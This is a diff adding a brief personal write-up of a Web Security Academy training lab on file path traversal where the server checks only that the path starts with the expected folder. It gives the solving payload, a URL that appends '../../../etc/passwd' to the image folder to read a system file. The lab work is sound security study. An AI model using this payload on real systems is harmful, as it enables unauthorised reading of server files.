@@ -1,0 +1,17 @@
+Lab: File path traversal, validation of start of path
+
+ This lab contains a path traversal vulnerability in the display of product images.
+
+The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.
+
+To solve the lab, retrieve the contents of the /etc/passwd file. 
+
+
+https://0a2000b403a07c9780fbf8d400aa00f3.web-security-academy.net/image?filename=/var/www/images/18.jpg
+
+lets try with ../../../etc/passwd
+
+https://0a2000b403a07c9780fbf8d400aa00f3.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd
+
+
+DONE :D
